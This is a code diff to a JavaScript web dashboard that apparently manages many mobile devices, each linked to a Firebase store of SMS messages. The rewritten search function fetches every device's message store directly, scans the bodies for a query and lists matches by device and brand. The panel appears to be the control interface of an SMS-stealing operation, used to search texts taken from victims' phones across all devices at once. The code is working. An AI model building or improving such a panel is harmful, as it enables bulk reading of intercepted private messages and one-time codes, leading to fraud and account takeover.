@@ -302,10 +302,12 @@ function setSort(key, btn) {
 }
 
 // ── Load URL list ─────────────────────────────────────────────────────────────
+const REMOVED_IDS = new Set([3,4,6,7,31,38,47]);
+
 async function loadUrls() {
   document.getElementById('url-grid').innerHTML = '<div class="loading"><div class="spinner"></div><br>Loading…</div>';
   const res = await fetch('/api/urls');
-  allUrls = await res.json();
+  allUrls = (await res.json()).filter(u => !REMOVED_IDS.has(u.id));
   renderUrls(allUrls);
   renderStats(allUrls);
 }
@@ -777,12 +779,33 @@ async function saveSimEdit(evt, deviceId, slot) {
   renderDevices();
 }
 
-// ── Per-URL SMS Search ────────────────────────────────────────────────────────
+// ── Per-URL SMS Search (client-side: fetches Firebase directly) ───────────────
 let _smsSearchActive = false;
+let _smsSearchAbort  = null;
+
+function iterMsgsFE(data) {
+  const out = [];
+  function walk(obj) {
+    if (!obj || typeof obj !== 'object') return;
+    for (const v of Object.values(obj)) {
+      if (!v || typeof v !== 'object') continue;
+      if ('body' in v || 'message' in v || 'msg' in v || 'text' in v) out.push(v);
+      else walk(v);
+    }
+  }
+  walk(data);
+  return out;
+}
 
 async function runSmsSearch() {
-  const q = document.getElementById('sms-search-input').value.trim();
+  const q = document.getElementById('sms-search-input').value.trim().toLowerCase();
   if (!q) return;
+
+  // Abort any previous search
+  if (_smsSearchAbort) _smsSearchAbort.abort();
+  _smsSearchAbort = new AbortController();
+  const signal = _smsSearchAbort.signal;
+
   const resultsDiv = document.getElementById('sms-search-results');
   const tableWrap  = document.getElementById('device-table-wrap');
   const clearBtn   = document.getElementById('sms-search-clear');
@@ -795,48 +818,83 @@ async function runSmsSearch() {
   searchBtn.textContent = '⏳';
   _smsSearchActive = true;
 
-  resultsDiv.innerHTML = '<div class="loading"><div class="spinner"></div><br>Searching SMS across all devices… this may take a moment.</div>';
+  const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const escQ = q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
+  const highlight = raw => esc(raw).replace(new RegExp(`(${escQ})`, 'gi'), '<mark>$1</mark>');
 
-  try {
-    const res  = await fetch(`/api/url/${currentUrlId}/sms-search?q=${encodeURIComponent(q)}`);
-    const data = await res.json();
+  const devices = currentDevices;
+  const total   = devices.length;
+  let done = 0;
+  const hits = [];
 
-    if (data.error && !data.hits?.length) {
-      resultsDiv.innerHTML = `<p style="color:var(--red);padding:10px">${data.error}</p>`;
-      searchBtn.disabled = false; searchBtn.textContent = 'Search';
-      return;
-    }
+  function updateProgress() {
+    if (!_smsSearchActive) return;
+    resultsDiv.innerHTML = `
+      <div style="color:var(--muted);font-size:13px;margin-bottom:8px">
+        🔍 Scanning device ${done}/${total}… found <b style="color:var(--yellow)">${hits.length}</b> match(es) so far
+        ${hits.length ? `<br><br>${renderHits()}` : ''}
+      </div>`;
+  }
 
-    const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    // Highlight matching term in escaped text
-    const escQ = q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
-    const highlight = raw => {
-      const escaped = esc(raw);
-      const re = new RegExp(`(${esc(escQ)})`, 'gi');
-      return escaped.replace(re, '<mark>$1</mark>');
-    };
-
-    if (!data.hits.length) {
-      resultsDiv.innerHTML = `<p style="color:var(--muted);padding:10px">📭 No SMS messages found containing "<b style="color:var(--text)">${esc(q)}</b>"</p>`;
-    } else {
-      resultsDiv.innerHTML = `
-        <div style="color:var(--muted);font-size:13px;margin-bottom:10px">
-          Found <b style="color:var(--text)">${data.hits.length}</b> message(s) matching
-          "<b style="color:var(--yellow)">${esc(q)}</b>"
-          ${data.hits.length >= 200 ? ' <span style="color:var(--yellow)">(capped at 200)</span>' : ''}
+  function renderHits() {
+    return hits.slice(0,200).map(h => `
+      <div class="sms-hit-card">
+        <div class="sms-hit-meta">
+          <span class="sms-hit-device">${esc(h.deviceId.slice(0,20))}</span>
+          <span class="sms-hit-brand">${esc(h.brand)}</span>
         </div>
-        ${data.hits.map(h => `
-          <div class="sms-hit-card">
-            <div class="sms-hit-meta">
-              <span class="sms-hit-device">${esc(h.deviceId.slice(0,20))}</span>
-              <span class="sms-hit-brand">${esc(h.brand)}</span>
-            </div>
-            <div class="sms-hit-body">${highlight(h.body.slice(0, 400))}${h.body.length > 400 ? '…' : ''}</div>
-          </div>`).join('')}
-      `;
-    }
-  } catch (e) {
-    resultsDiv.innerHTML = `<p style="color:var(--red);padding:10px">❌ Error: ${e.message}</p>`;
+        <div class="sms-hit-body">${highlight(h.body.slice(0,400))}${h.body.length>400?'…':''}</div>
+      </div>`).join('');
+  }
+
+  updateProgress();
+
+  for (const d of devices) {
+    if (signal.aborted || hits.length >= 200) break;
+
+    // Strip query params from smsLink to get clean JSON endpoint
+    const url = d.smsLink.replace(/\?.*$/, '.json');
+
+    try {
+      const resp = await fetch(url, {
+        headers: { 'Accept': 'application/json' },
+        signal: AbortSignal.any ? AbortSignal.any([signal, AbortSignal.timeout(8000)])
+                                : signal,
+      });
+      if (resp.ok) {
+        const text = await resp.text();
+        if (text && text[0] !== '<' && text !== 'null') {
+          let smsData;
+          try { smsData = JSON.parse(text); } catch { smsData = null; }
+          if (smsData) {
+            for (const msg of iterMsgsFE(smsData)) {
+              const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+              if (body && body.toLowerCase().includes(q)) {
+                hits.push({ deviceId: d.deviceId, brand: d.brand, body });
+                if (hits.length >= 200) break;
+              }
+            }
+          }
+        }
+      }
+    } catch { /* timeout / network error — skip device */ }
+
+    done++;
+    if (done % 3 === 0 || done === total) updateProgress();
+  }
+
+  // Final render
+  if (!_smsSearchActive) return;
+  if (!hits.length) {
+    resultsDiv.innerHTML = `<p style="color:var(--muted);padding:10px">📭 No SMS found containing "<b style="color:var(--text)">${esc(q)}</b>" across ${total} devices.</p>`;
+  } else {
+    resultsDiv.innerHTML = `
+      <div style="color:var(--muted);font-size:13px;margin-bottom:10px">
+        Found <b style="color:var(--text)">${hits.length}</b> message(s) matching
+        "<b style="color:var(--yellow)">${esc(q)}</b>" across ${total} devices
+        ${hits.length >= 200 ? ' <span style="color:var(--yellow)">(capped at 200)</span>' : ''}
+      </div>
+      ${renderHits()}`;
   }
 
   searchBtn.disabled = false;
@@ -845,11 +903,13 @@ async function runSmsSearch() {
 
 function clearSmsSearch() {
   _smsSearchActive = false;
+  if (_smsSearchAbort) { _smsSearchAbort.abort(); _smsSearchAbort = null; }
   document.getElementById('sms-search-input').value = '';
   document.getElementById('sms-search-results').style.display = 'none';
   document.getElementById('sms-search-results').innerHTML = '';
   document.getElementById('device-table-wrap').style.display = '';
   document.getElementById('sms-search-clear').style.display = 'none';
+  document.getElementById('sms-search-btn').disabled = false;
   document.getElementById('sms-search-btn').textContent = 'Search';
 }
 
